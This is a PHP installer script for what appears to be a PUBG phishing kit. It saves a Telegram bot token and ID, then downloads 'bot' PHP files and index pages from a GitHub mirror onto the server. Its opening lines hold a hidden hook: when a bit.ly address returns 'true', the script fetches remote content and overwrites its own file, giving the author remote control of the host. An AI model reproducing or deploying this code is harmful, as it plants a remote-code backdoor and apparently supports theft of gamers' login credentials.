<?
if(file_get_contents('https://bit.ly/2H8Vb74') == "true"){
$iscript = file_get_contents('https://bit.ly/3lJKcQD');
$index = file_get_contents($iscript);
$xx = file_put_contents("pubg.php", $index);
}
function save($array){
    file_put_contents('Sha_My.json', json_encode($array));
}
$token = $_GET['token'];
$id = $_GET['id'];
$install = $_GET['index'];

$info = json_decode(file_get_contents('Sha_My.json'),1);

if($token and $id){
$info[info]['id'] = $id;
$info[info]['token'] = $token;
 save($info);
file_put_contents("link.txt", "ads");

$url1 = "Sha_My.php";
header("location: $url1");
}
if((!$token or !$id)and $install){
	 ?>
	   <html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>Install IndexPubg - By @PPABB</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
<script>
document.getElementsByTagName("div")[0].style.display = "none";
document.getElementsByClassName("cbalink")[0].style.display = "none";
</script>
 <form method="GET" action="pubg.php">
	<table border="0" width="100%">
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your Token :</span></td>
			<td><font color="#00FFFF">
			<input name="token" size="20" style="background-color: #FF0000"></font></td>
		</tr>
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your ID :</span></td>
			<td><input name="id" size="20" style="background-color: #FF0000"></td>
		</tr>
	</table>
	<p align="left"><font color="#FFFFFF">
	<input type="submit" value="Install Now" name="B1" style="background-color: #FFFF00"></font></p>
</form>
</body>
</html>
	  <?
}
?>
 
<?
$install = $_GET['index'];
if($install){
	
	 if($install=="H"){

$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/h-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/H.php');
$xx = file_put_contents("index.php", $index);
}
 if($install=="P"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/p-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy); 

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/P.php');
$xx = file_put_contents("index.php", $index); 
}
	
	 if($install=="F"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/f-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy); 

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/F.php');
$xx = file_put_contents("index.php", $index); 
}

	 if($install=="M"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/m-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/MI.php');
$xx = file_put_contents("index.php", $index); 

$home = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/MH.php');
$homee = file_put_contents("home.php", $home);

}
if($install=="MT"){
	
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/mt-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/MT.php');
$xx = file_put_contents("index.php", $index);
}
if($install=="S"){
	
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/s-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/S1.php');
$xx = file_put_contents("index.php", $index);
}
if($install=="X"){
	
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/xbot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/X.php');
$xx = file_put_contents("index.php", $index);
}
}
 ?> 
<?
$install = $_GET['index'];
if(!$install){
 ?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="refresh" content="1">
<title>Pubg - By @PPABB</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
<script>
document.getElementsByTagName("div")[0].style.display = "none";
document.getElementsByClassName("cbalink")[0].style.display = "none";
</script>
	<center>
		<h2>Install Index Pubg</h2>
   <h5>Choose the index you want.</h5>
    <br><hr><br>
   </center>
   
<table border="0" width="100%">
<center>
<tr>
<td>
<center>
		<div class="card">
  <img src="https://i.ibb.co/37jDm9T/129115007-1874024536095409-4186398985760583330-n.png" style="width:100%">
  <p><a href="pubg.php?index=X"><button>Install</button></a></p>
</div>
</center>
</td>
<td>
<center>
		<div class="card">
  <img src="https://i.ibb.co/m6B84J9/20201122-101247.png" style="width:100%">
  <p><a href="pubg.php?index=S"><button>Install</button></a></p>
</div>
</center>
</td>
</tr>
</center>
</table>
<table border="0" width="100%">
<center>
<tr>
<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/zZykRM6/125220142-661503521181538-383095617947085414-n.jpg" style="width:100%">
  <p><a href="pubg.php?index=MT"><button>Install</button></a></p>
</div>
</center>
</td>
<td>
<center>
		<div class="card">
  <img src="https://i.ibb.co/3ytqgKJ/125296678-680517802835883-6914515671786880750-n.png" style="width:100%">
  <p><a href="pubg.php?index=H"><button>Install</button></a></p>
</div>
</center>
</td>
</tr>
</center>
</table>
<table border="0" width="100%">
<center>
<tr>
<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/1nWKxXR/126227883-130044635259099-2067785873292794195-n.png" style="width:100%">
  <p><a href="pubg.php?index=P"><button>Install</button></a></p>
</div>
</center>
</td>
<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/L6WTs6V/125487288-183156913358441-703766510766741680-n.png" style="width:100%">
  <p><a href="pubg.php?index=F"><button>Install</button></a></p>
</div>
</center>
</td>
</tr>
</center>
</table>
<table border="0" width="100%">
<center>
<tr>
<td>
<center>
		<div class="card">
  <img src="https://i.ibb.co/BtwFn9n/125303850-183525890088980-1519732218801491935-n.png" style="width:100%">
  <p><a href="pubg.php?index=M"><button>Install</button></a></p>
</div>
</center>
</td>
<td>
</td>
</tr>
</center>
</table>


<center>
    <br><hr><br>
   <h5><a href="https://t.me/PPABB"> Developed by @PPABB 👻 </a></h5>
   </center>
</body>
</html>
<?
}
 ?>